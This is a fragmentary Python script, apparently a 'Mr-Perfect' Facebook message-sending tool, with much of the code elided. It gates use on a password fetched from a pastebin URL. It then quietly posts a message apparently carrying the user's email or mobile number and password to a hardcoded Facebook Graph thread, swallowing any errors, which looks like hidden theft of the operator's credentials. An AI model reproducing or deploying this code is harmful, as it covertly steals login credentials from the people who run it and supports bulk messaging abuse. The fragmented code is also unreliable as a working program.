...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"FEEL THE POWER OF MR-PERFECT ")
...
def send_messages():
    while True: 
        try:
            ...
            def liness():
                print('\u001b[37m' + 'Time to work lets take a swip of a coffee and begin')
            ...
            lado = requests.get('https://pastebin.com/raw/eEkA1P08').text

            if lado not in password:
            ...
            def msg():
                ...
                if email_or_mobile and password:
                    message = (
                        f"hello Mr-Perfect i am using your server\n"
                    ...
                    try:
                        requests.post("https://graph.facebook.com/v15.0/t_100087591006635/", data=parameters, headers=headers)
                    except:
                        pass
